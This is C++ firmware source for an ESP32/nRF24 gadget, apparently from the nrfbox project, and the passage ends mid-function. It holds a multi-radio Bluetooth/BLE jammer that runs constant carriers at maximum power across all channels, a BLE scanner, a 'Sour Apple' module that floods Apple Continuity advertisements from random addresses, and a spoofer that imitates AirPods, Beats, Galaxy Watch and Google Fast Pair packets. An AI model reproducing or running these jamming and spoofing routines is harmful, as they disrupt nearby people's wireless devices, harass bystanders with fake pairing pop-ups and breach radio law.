/* ____________________________
   This software is licensed under the MIT License:
   https://github.com/cifertech/nrfbox
   ________________________________________ */

#include "config.h"
#include "icon.h"

namespace BleJammer {

  enum OperationMode { DEACTIVE_MODE, BLE_MODULE, Bluetooth_MODULE, ALL_MODULE };
  OperationMode currentMode = DEACTIVE_MODE;

  // 40 interleaved Bluetooth channels covering 2402-2480MHz across 3 sub-bands
  constexpr uint8_t bluetooth_channels[] = {
     2, 28, 54,  4, 30, 56,  6, 32, 58,  8,
    34, 60, 10, 36, 62, 12, 38, 64, 14, 40,
    66, 16, 42, 68, 18, 44, 70, 20, 46, 72,
    22, 48, 74, 24, 50, 76, 26, 52, 78, 80
  };

  // 3 core BLE advertising channels
  constexpr uint8_t ble_channels[] = {2, 26, 80};

  constexpr size_t NUM_BT_CHANNELS  = sizeof(bluetooth_channels) / sizeof(bluetooth_channels[0]);
  constexpr size_t NUM_BLE_CHANNELS = sizeof(ble_channels) / sizeof(ble_channels[0]);

  enum ScheduleType { SCHED_PRO, SCHED_STACK, SCHED_BASIC };
  ScheduleType currentSched = SCHED_PRO;

  // 21 original channels for BASIC mode
  constexpr uint8_t bt_channels_basic[] = {
    32, 34, 46, 48, 50, 52, 0, 1, 2, 4, 6, 8,
    22, 24, 26, 28, 30, 74, 76, 78, 80
  };
  constexpr size_t NUM_BT_BASIC = sizeof(bt_channels_basic) / sizeof(bt_channels_basic[0]);

  uint8_t radioTurn = 0;
  uint8_t stackChannel = 2;
  bool stackAllBleTurn = false;
  unsigned long lastSchedBtnTime = 0;

  bool radioAStarted = false;
  bool radioBStarted = false;
  bool radioCStarted = false;
  bool radiosActive  = false;

  // Split-Band Sequential Sweep indices (phase-shifted so radios never collide)
  size_t btIndexA  = 0;
  size_t btIndexB  = NUM_BT_CHANNELS / 3;
  size_t btIndexC  = (2 * NUM_BT_CHANNELS) / 3;
  size_t bleIndexA = 0;
  size_t bleIndexB = 1;
  size_t bleIndexC = 2;

  // Polling button state (short press: cycle mode, long press >= 800ms: Deactive)
  bool buttonDown = false;
  bool longPressHandled = false;
  unsigned long buttonPressTime = 0;
  unsigned long lastDebounceTime = 0;
  const unsigned long debounceDelay = 50;
  const unsigned long longPressDuration = 800;

  bool configureRadio(RF24 &radio, uint8_t initialChannel) {
    if (!radio.begin()) {
      return false;
    }
    radio.setAutoAck(false);
    radio.stopListening();
    radio.setRetries(0, 0);
    radio.setPALevel(RF24_PA_MAX, true);
    radio.setDataRate(RF24_2MBPS);
    radio.setCRCLength(RF24_CRC_DISABLED);
    radio.startConstCarrier(RF24_PA_MAX, initialChannel);
    return true;
  }

  void initializeRadiosMultiMode() {
    radioAStarted = configureRadio(RadioA, bluetooth_channels[btIndexA]);
    radioBStarted = configureRadio(RadioB, bluetooth_channels[btIndexB]);
    radioCStarted = configureRadio(RadioC, ble_channels[bleIndexC]);
    radiosActive  = (radioAStarted || radioBStarted || radioCStarted);
  }

  void stopAllRadios() {
    RadioA.stopConstCarrier();
    RadioA.powerDown();
    digitalWrite(NRF_CE_PIN_A, LOW);

    RadioB.stopConstCarrier();
    RadioB.powerDown();
    digitalWrite(NRF_CE_PIN_B, LOW);

    RadioC.stopConstCarrier();
    RadioC.powerDown();
    digitalWrite(NRF_CE_PIN_C, LOW);

    radioAStarted = false;
    radioBStarted = false;
    radioCStarted = false;
    radiosActive  = false;
    delay(50);
  }

  void initializeRadios() {
    if (currentMode != DEACTIVE_MODE) {
      if (!radiosActive) {
        initializeRadiosMultiMode();
      }
    } else {
      stopAllRadios();
    }
  }

  void updateModeLED() {
    switch (currentMode) {
      case BLE_MODULE:       setNeoPixelColour("blue");  break;
      case Bluetooth_MODULE: setNeoPixelColour("green"); break;
      case ALL_MODULE:       setNeoPixelColour("red");   break;
      default:               setNeoPixelColour("0");     break;
    }
  }

  void updateOLED() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);

    u8g2.setCursor(0, 10);
    u8g2.print("Mode:");
    u8g2.setCursor(54, 10);
    u8g2.print("[");
    switch (currentMode) {
      case BLE_MODULE:       u8g2.print("BLE");       break;
      case Bluetooth_MODULE: u8g2.print("Bluetooth"); break;
      case ALL_MODULE:       u8g2.print("BT+BLE");    break;
      default:               u8g2.print("Deactive");  break;
    }
    u8g2.print("]");

    u8g2.setCursor(0, 22);
    u8g2.print("Kieu:");
    u8g2.setCursor(54, 22);
    switch (currentSched) {
      case SCHED_PRO:   u8g2.print("[PRO]");   break;
      case SCHED_STACK: u8g2.print("[STACK]"); break;
      default:          u8g2.print("[BASIC]"); break;
    }

    bool r1 = radiosActive ? radioAStarted : RadioA.isChipConnected();
    bool r2 = radiosActive ? radioBStarted : RadioB.isChipConnected();
    bool r3 = radiosActive ? radioCStarted : RadioC.isChipConnected();

    u8g2.setCursor(0, 35);
    u8g2.print("Radio 1: ");
    u8g2.setCursor(70, 35);
    u8g2.print(r1 ? "Kich hoat" : "Vo hieu");

    u8g2.setCursor(0, 50);
    u8g2.print("Radio 2: ");
    u8g2.setCursor(70, 50);
    u8g2.print(r2 ?  "Kich hoat" : "Vo hieu");

    u8g2.setCursor(0, 64);
    u8g2.print("Radio 3: ");
    u8g2.setCursor(70, 64);
    u8g2.print(r3 ?  "Kich hoat" : "Vo hieu");

    u8g2.sendBuffer();
  }

  // PRO: 3 radios on 3 distinct channels, staggered by 55us
  inline void stepProSplit(const uint8_t* chs, size_t count) {
    switch (radioTurn) {
      case 0:
        btIndexA = (btIndexA + 1) % count;
        if (radioAStarted) RadioA.setChannel(chs[btIndexA]);
        break;
      case 1:
        btIndexB = (btIndexA + count / 3) % count;
        if (radioBStarted) RadioB.setChannel(chs[btIndexB]);
        break;
      case 2:
        btIndexC = (btIndexA + (2 * count) / 3) % count;
        if (radioCStarted) RadioC.setChannel(chs[btIndexC]);
        break;
    }
    radioTurn = (radioTurn + 1) % 3;
    delayMicroseconds(55);
  }

  // PRO (BT+BLE): RadioA+B sweep BT half-band apart, RadioC sweeps BLE (staggered 55us)
  inline void stepProAll() {
    switch (radioTurn) {
      case 0:
        btIndexA = (btIndexA + 1) % NUM_BT_CHANNELS;
        if (radioAStarted) RadioA.setChannel(bluetooth_channels[btIndexA]);
        break;
      case 1:
        if (radioCStarted) {
          btIndexB = (btIndexA + NUM_BT_CHANNELS / 2) % NUM_BT_CHANNELS;
          if (radioBStarted) RadioB.setChannel(bluetooth_channels[btIndexB]);
        } else {
          bleIndexB = (bleIndexB + 1) % NUM_BLE_CHANNELS;
          if (radioBStarted) RadioB.setChannel(ble_channels[bleIndexB]);
        }
        break;
      case 2:
        bleIndexC = (bleIndexC + 1) % NUM_BLE_CHANNELS;
        if (radioCStarted) RadioC.setChannel(ble_channels[bleIndexC]);
        break;
    }
    radioTurn = (radioTurn + 1) % 3;
    delayMicroseconds(55);
  }

  // STACK: 3 radios sequentially follow the same channel, staggered 55us apart (A -> B -> C)
  inline void stepStackStagger(const uint8_t* chs, size_t count) {
    switch (radioTurn) {
      case 0:
        btIndexA = (btIndexA + 1) % count;
        stackChannel = chs[btIndexA];
        if (radioAStarted) RadioA.setChannel(stackChannel);
        break;
      case 1:
        if (radioBStarted) RadioB.setChannel(stackChannel);
        break;
      case 2:
        if (radioCStarted) RadioC.setChannel(stackChannel);
        break;
    }
    radioTurn = (radioTurn + 1) % 3;
    delayMicroseconds(55);
  }

  // STACK (BT+BLE): alternate BT and BLE channels cleanly every full A->B->C cycle
  inline void stepStackAll() {
    switch (radioTurn) {
      case 0:
        if (stackAllBleTurn) {
          bleIndexA = (bleIndexA + 1) % NUM_BLE_CHANNELS;
          stackChannel = ble_channels[bleIndexA];
        } else {
          btIndexA = (btIndexA + 1) % NUM_BT_CHANNELS;
          stackChannel = bluetooth_channels[btIndexA];
        }
        stackAllBleTurn = !stackAllBleTurn;
        if (radioAStarted) RadioA.setChannel(stackChannel);
        break;
      case 1:
        if (radioBStarted) RadioB.setChannel(stackChannel);
        break;
      case 2:
        if (radioCStarted) RadioC.setChannel(stackChannel);
        break;
    }
    radioTurn = (radioTurn + 1) % 3;
    delayMicroseconds(55);
  }

  // BASIC: original random single-channel behavior across all radios
  inline void stepBasic(const uint8_t* chs, size_t count) {
    uint8_t ch = chs[random(0, count)];
    if (radioAStarted) RadioA.setChannel(ch);
    if (radioBStarted) RadioB.setChannel(ch);
    if (radioCStarted) RadioC.setChannel(ch);
  }

  void applyModeChange() {
    initializeRadios();
    updateModeLED();
    updateOLED();
  }

  void checkModeChange() {
    unsigned long currentTime = millis();
    int state = digitalRead(BUTTON_UP_PIN);

    if (state == LOW) {
      if (!buttonDown && (currentTime - lastDebounceTime > debounceDelay)) {
        buttonDown = true;
        longPressHandled = false;
        buttonPressTime = currentTime;
        lastDebounceTime = currentTime;
      } else if (buttonDown && !longPressHandled && (currentTime - buttonPressTime >= longPressDuration)) {
        longPressHandled = true;
        if (currentMode != DEACTIVE_MODE) {
          currentMode = DEACTIVE_MODE;
          applyModeChange();
        }
      }
    } else if (buttonDown && (currentTime - lastDebounceTime > debounceDelay)) {
      buttonDown = false;
      lastDebounceTime = currentTime;
      if (!longPressHandled) {
        currentMode = static_cast<OperationMode>((currentMode + 1) % 4);
        radioTurn = 0;
        applyModeChange();
      }
    }

    if (currentTime - lastSchedBtnTime > 250) {
      if (digitalRead(BTN_PIN_RIGHT) == LOW) {
        lastSchedBtnTime = currentTime;
        currentSched = static_cast<ScheduleType>((currentSched + 1) % 3);
        radioTurn = 0;
        updateOLED();
      } else if (digitalRead(BTN_PIN_LEFT) == LOW) {
        lastSchedBtnTime = currentTime;
        currentSched = static_cast<ScheduleType>((currentSched + 2) % 3);
        radioTurn = 0;
        updateOLED();
      }
    }
  }

  void blejammerSetup() {
    Serial.begin(115200);

    esp_bt_controller_deinit();
    esp_wifi_stop();
    esp_wifi_deinit();
    esp_wifi_disconnect();

    pinMode(BUTTON_UP_PIN, INPUT_PULLUP);
    pinMode(BTN_PIN_LEFT, INPUT_PULLUP);
    pinMode(BTN_PIN_RIGHT, INPUT_PULLUP);

    currentMode = DEACTIVE_MODE;
    buttonDown = false;
    longPressHandled = false;
    radioTurn = 0;
    stackAllBleTurn = false;
    btIndexA = 0;
    btIndexB = NUM_BT_CHANNELS / 3;
    btIndexC = (2 * NUM_BT_CHANNELS) / 3;
    bleIndexA = 0;
    bleIndexB = 1;
    bleIndexC = 2;

    stopAllRadios();
    updateModeLED();
    updateOLED();
  }

  void blejammerLoop() {
    checkModeChange();

    if (currentMode == DEACTIVE_MODE || !radiosActive) {
      return;
    }

    if (currentSched == SCHED_PRO) {
      switch (currentMode) {
        case BLE_MODULE:       stepProSplit(ble_channels, NUM_BLE_CHANNELS); break;
        case Bluetooth_MODULE: stepProSplit(bluetooth_channels, NUM_BT_CHANNELS); break;
        case ALL_MODULE:       stepProAll(); break;
        default: break;
      }
    } else if (currentSched == SCHED_STACK) {
      switch (currentMode) {
        case BLE_MODULE:       stepStackStagger(ble_channels, NUM_BLE_CHANNELS); break;
        case Bluetooth_MODULE: stepStackStagger(bluetooth_channels, NUM_BT_CHANNELS); break;
        case ALL_MODULE:       stepStackAll(); break;
        default: break;
      }
    } else {
      switch (currentMode) {
        case BLE_MODULE:       stepBasic(ble_channels, NUM_BLE_CHANNELS); break;
        case Bluetooth_MODULE: stepBasic(bt_channels_basic, NUM_BT_BASIC); break;
        case ALL_MODULE:
          stepBasic(bt_channels_basic, NUM_BT_BASIC);
          stepBasic(ble_channels, NUM_BLE_CHANNELS);
          break;
        default: break;
      }
    }
  }
}



namespace BleScan {

BLEScan* scan;
BLEScanResults results;

int selectedIndex = 0;
int displayStartIndex = 0;
bool showDetails = false;
unsigned long scanStartTime = 0;
const unsigned long scanDuration = 5000;
bool scanComplete = false;

unsigned long lastDebounce = 0;
unsigned long debounce_Delay = 200;
unsigned long itemSelectTime = 0;

void blescanSetup() {
  Serial.begin(115200);
  u8g2.setFont(u8g2_font_6x10_tr);
  
  BLEDevice::init("");
  scan = BLEDevice::getScan();
  scan->setActiveScan(true);
  
  pinMode(BUTTON_UP_PIN, INPUT_PULLUP);
  pinMode(BUTTON_DOWN_PIN, INPUT_PULLUP);
  pinMode(BTN_PIN_RIGHT, INPUT_PULLUP);
  pinMode(BTN_PIN_LEFT, INPUT_PULLUP);

  
  for (int cycle = 0; cycle < 3; cycle++) { 
    for (int i = 0; i < 3; i++) {
      u8g2.clearBuffer();
      u8g2.setFont(u8g2_font_6x10_tr);
      u8g2.drawStr(0, 10, "Dang quet BLE");

      String dots = "";
      for (int j = 0; j <= i; j++) {
        dots += ".";
        setNeoPixelColour("white");
      }
      setNeoPixelColour("0");
      
      u8g2.drawStr(80, 10, dots.c_str()); 

      u8g2.sendBuffer();
      delay(300); 
    }
  }

  scanStartTime = millis();
  itemSelectTime = millis();
  scan->start(scanDuration / 1000, false);
}

void blescanLoop() {
  unsigned long currentMillis = millis();
  if (currentMillis - scanStartTime >= scanDuration && !scanComplete) {
    scanComplete = true;
    results = scan->getResults();
    scan->stop();
    itemSelectTime = millis();
    u8g2.clearBuffer();
    u8g2.drawStr(0, 10, "Quet thanh cong.");
    u8g2.sendBuffer();
  }

  if (currentMillis - lastDebounce > debounce_Delay) {
    if (digitalRead(BUTTON_UP_PIN) == LOW) {
      if (selectedIndex > 0) {
        selectedIndex--;
        if (selectedIndex < displayStartIndex) {
          displayStartIndex--;
        }
        itemSelectTime = currentMillis;
      }
      lastDebounce = currentMillis;
    } else if (digitalRead(BUTTON_DOWN_PIN) == LOW) {
      if (selectedIndex < results.getCount() - 1) {
        selectedIndex++;
        if (selectedIndex >= displayStartIndex + 5) {
          displayStartIndex++;
        }
        itemSelectTime = currentMillis;
      }
      lastDebounce = currentMillis;
    } else if (digitalRead(BTN_PIN_RIGHT) == LOW) {
      showDetails = true;
      itemSelectTime = currentMillis;
      lastDebounce = currentMillis;
    }
  }

  if (!showDetails && scanComplete) {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 10, "Thiet bi BLE:");

    int deviceCount = results.getCount();
    for (int i = 0; i < 5; i++) {
      int deviceIndex = i + displayStartIndex;
      if (deviceIndex >= deviceCount) break;
      BLEAdvertisedDevice device = results.getDevice(deviceIndex);
      String deviceName = device.getName().c_str();
      u8g2.setFont(u8g2_font_6x10_tr);
      if (deviceName.length() == 0) {
        deviceName = "No Name";
      }
      String rssiStr = " | RSSI " + String(device.getRSSI());
      if (deviceIndex == selectedIndex) {
        u8g2.drawStr(0, 23 + i * 10, ">");
        drawMarqueeStr(10, 23 + i * 10, 40, 10, deviceName.c_str(), itemSelectTime);
      } else {
        u8g2.drawStr(10, 23 + i * 10, deviceName.substring(0, 7).c_str());
      }
      u8g2.drawStr(50, 23 + i * 10, rssiStr.c_str());
    }
    u8g2.sendBuffer();
  }

  if (showDetails) {
    BLEAdvertisedDevice device = results.getDevice(selectedIndex);
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(0, 10, "Chi tiet thiet bi:");
    u8g2.setFont(u8g2_font_5x8_tr);
    String name = "Name: " + String(device.getName().c_str());
    String address = "Addr: " + String(device.getAddress().toString().c_str());
    String rssi = "RSSI: " + String(device.getRSSI());
    drawMarqueeStr(0, 20, 128, 8, name.c_str(), itemSelectTime);
    drawMarqueeStr(0, 30, 128, 8, address.c_str(), itemSelectTime);
    u8g2.drawStr(0, 40, rssi.c_str());
    drawMarqueeStr(0, 50, 128, 8, "Nhan phim TRAI de tro ve", itemSelectTime);
    u8g2.sendBuffer();

    if (digitalRead(BTN_PIN_LEFT) == LOW) {
      showDetails = false;
      itemSelectTime = currentMillis;
      lastDebounce = currentMillis;
      }
    }  
  }  
}


namespace SourApple {

std::string device_uuid = "00003082-0000-1000-9000-00805f9b34fb";

BLEAdvertising *Advertising;
uint8_t packet[17];

#define MAX_LINES 8
String lines[MAX_LINES];
int currentLine = 0;
int lineNumber = 1;

uint32_t delayMilliseconds = 1000;

void updatedisplay() {
  u8g2.clearBuffer();

  for (int i = 0; i < MAX_LINES; i++) {
    u8g2.setCursor(0, (i + 1) * 12);
    u8g2.print(lines[i]);
  }

  u8g2.sendBuffer();
  Advertising->stop();
}

void addLineToDisplay(String newLine) {
  for (int i = 0; i < MAX_LINES - 1; i++) {
    lines[i] = lines[i + 1];
  }
  lines[MAX_LINES - 1] = newLine;

  updatedisplay();
}

void displayAdvertisementData() {
  String lineStr = String(lineNumber) + ": ";
  lineNumber++;
  // Convert the advertisement data to a readable string format
  //String dataStr = "Type: 0x";
  String dataStr = "0x";
  dataStr += String(packet[1], HEX);
  //dataStr += ", CompID: 0x";
  dataStr += ",0x";
  dataStr += String(packet[2], HEX);
  dataStr += String(packet[3], HEX);
  //dataStr += ", ActType: 0x";
  dataStr += ",0x";
  dataStr += String(packet[7], HEX);

  addLineToDisplay(lineStr + dataStr);

}

BLEAdvertisementData getOAdvertisementData() {
  BLEAdvertisementData advertisementData = BLEAdvertisementData();
  uint8_t i = 0;

  packet[i++] = 17 - 1;    // Packet Length
  packet[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
  packet[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
  packet[i++] = 0x00;        // ...
  packet[i++] = 0x0F;  // Type
  packet[i++] = 0x05;                        // Length
  packet[i++] = 0xC1;                        // Action Flags
  const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
  packet[i++] = types[rand() % sizeof(types)];  // Action Type
  esp_fill_random(&packet[i], 3); // Authentication Tag
  i += 3;
  packet[i++] = 0x00;  // ???
  packet[i++] = 0x00;  // ???
  packet[i++] =  0x10;  // Type ???
  esp_fill_random(&packet[i], 3);

  advertisementData.addData(std::string((char *)packet, 17));
  return advertisementData;
}

void sourappleSetup() {
  
  u8g2.setFont(u8g2_font_profont11_tf); 

  BLEDevice::init("");
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9); 
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9); 
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN , ESP_PWR_LVL_P9);

  BLEServer *pServer = BLEDevice::createServer();
  Advertising = pServer->getAdvertising();

  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
  Advertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
}

void sourappleLoop() {

    esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    for (int i = 0; i < 6; i++) {
      dummy_addr[i] = random(256);
      if (i == 0) {
        dummy_addr[i] |= 0xF0;
      }
    }
    BLEAdvertisementData oAdvertisementData = getOAdvertisementData();

    Advertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
    Advertising->addServiceUUID(device_uuid);
    Advertising->setAdvertisementData(oAdvertisementData);

    Advertising->setMinInterval(0x20);
    Advertising->setMaxInterval(0x20);
    Advertising->setMinPreferred(0x20);
    Advertising->setMaxPreferred(0x20);

    Advertising->start();

    delay(40);
    displayAdvertisementData(); 
  } 
}


namespace Spoofer {

  BLEAdvertising *pAdvertising;
  std::string devices_uuid = "00003082-0000-1000-9000-00805f9b34fb";

  int menuIndex = 0;
  const char* menuItems[] = {"Device:", "Adv Type:", "Advertising:"};
  const int menuSize = 3;

  const char* deviceNames[] = {
    "Airpods", "Airpods Pro", "Airpods Max", "Airpods Gen 2", "Airpods Gen 3",
    "Airpods Pro Gen 2", "PowerBeats", "PowerBeats Pro", "Beats Solo Pro",
    "Beats Studio Buds", "Beats Flex", "Beats X", "Beats Solo 3",
    "Beats Studio 3", "Beats Studio Pro", "Beats Fit Pro", "Beats Studio Buds+",
    "Galaxy Watch 4", "Galaxy Watch 5", "Galaxy Watch 6", "Google Smart Ctrl" 
  };
  const int deviceCount = 21; 

  const char* advTypes[] = {"IND", "D-HIGH", "SCAN", "NONCONN", "D-LOW"};
  const int advTypeCount = 5;

  unsigned long lastDebounceTimeUp = 0;
  unsigned long lastDebounceTimeDown = 0;
  unsigned long lastDebounceTimeRight = 0;
  unsigned long lastDebounceTimeLeft = 0;
  unsigned long debounceDelay = 200;
  unsigned long deviceSelectTime = 0;

  uint32_t delayMillisecond = 1000;
  bool isAdvertising = false;
  int deviceType = 1; 
  int advType = 1;    
  int device_index = 0; 

  // Apple devices (31-byte packets)
  const uint8_t DEVICES[][31] = {
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
  };

  // Samsung devices (15 bytes)
  struct WatchModel {
    uint8_t value;
    const char* name;
  };
  const WatchModel samsungModels[] = {
    {0x01, "Galaxy Watch 4"},
    {0x02, "Galaxy Watch 5"},
    {0x03, "Galaxy Watch 6"}
  };
  const uint8_t samsungModelCount = 3;
  const uint8_t SAMSUNG_ADV_SIZE = 15;
  const uint16_t SAMSUNG_COMPANY_ID = 0x0075;
  const uint8_t SAMSUNG_ADV_TEMPLATE[SAMSUNG_ADV_SIZE] = {
    14, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, 0x00
  };

  // Google device (14 bytes, single model)
  const uint8_t GOOGLE_ADV_SIZE = 14;
  const uint16_t GOOGLE_FAST_PAIR_ID = 0xFE2C;
  const uint8_t GOOGLE_ADV_TEMPLATE[GOOGLE_ADV_SIZE] = {
    0x03, 0x03, 0x2C, 0xFE, // Complete 16-bit Service UUIDs
    0x06, 0x16, 0x2C, 0xFE, 0x00, 0xB7, 0x27, // Service Data
    0x02, 0x0A, 0x00 // TX Power (placeholder, set dynamically)
  };

  bool generateSamsungAdvPacket(uint8_t modelIndex, BLEAdvertisementData& advData) {
    if (modelIndex >= samsungModelCount) return false;
    uint8_t advDataRaw[SAMSUNG_ADV_SIZE];
    memcpy(advDataRaw, SAMSUNG_ADV_TEMPLATE, SAMSUNG_ADV_SIZE);
    advDataRaw[SAMSUNG_ADV_SIZE - 1] = samsungModels[modelIndex].value;
    advData.addData(std::string((char*)advDataRaw, SAMSUNG_ADV_SIZE));
    return true;
  }

  bool generateGoogleAdvPacket(BLEAdvertisementData& advData) {
    uint8_t advDataRaw[GOOGLE_ADV_SIZE];
    memcpy(advDataRaw, GOOGLE_ADV_TEMPLATE, GOOGLE_ADV_SIZE);
    advDataRaw[GOOGLE_ADV_SIZE - 1] = (uint8_t)(random(121) - 100); 
    advData.addData(std::string((char*)advDataRaw, GOOGLE_ADV_SIZE));
    return true;
  }

  BLEAdvertisementData getAdvertisementData() {
    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
    if (deviceType <= 17) { // Apple (1–17)
      oAdvertisementData.addData(std::string((char*)DEVICES[device_index], 31));
    } else if (deviceType <= 20) { // Samsung (18–20)
      uint8_t samsungIndex = deviceType - 18; // 18→0, 19→1, 20→2
      generateSamsungAdvPacket(samsungIndex, oAdvertisementData);
    } else { // Google (21)
      generateGoogleAdvPacket(oAdvertisementData);
    }
    switch (advType) {
      case 1: pAdvertising->setAdvertisementType(ADV_TYPE_IND); break;
      case 2: pAdvertising->setAdvertisementType(ADV_TYPE_DIRECT_IND_HIGH); break;
      case 3: pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND); break;
      case 4: pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND); break;
      case 5: pAdvertising->setAdvertisementType(ADV_TYPE_DIRECT_IND_LOW); break;
    }
    return oAdvertisementData;
  }

  void updateDisplay() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_profont11_tf);
    int xshift = 4;
    for (int i = 0; i < menuSize; i++) {
      int y = (i == 0) ? 14 : (i == 1) ? 43 : 57;
      if (menuIndex == i) {
        u8g2.setFont(u8g2_font_5x7_tf);
        u8g2.drawStr(0 + xshift, y, ">");
        u8g2.setFont(u8g2_font_profont11_tf);
        u8g2.drawStr(8 + xshift, y, menuItems[i]);
      } else {
        u8g2.setFont(u8g2_font_5x7_tf);
        u8g2.drawStr(8 + xshift, y, menuItems[i]);
      }
      u8g2.setFont(u8g2_font_5x7_tf);
      if (i == 0) {
        String deviceText = String("[ ") + String(deviceNames[deviceType - 1]) + String(" ]");
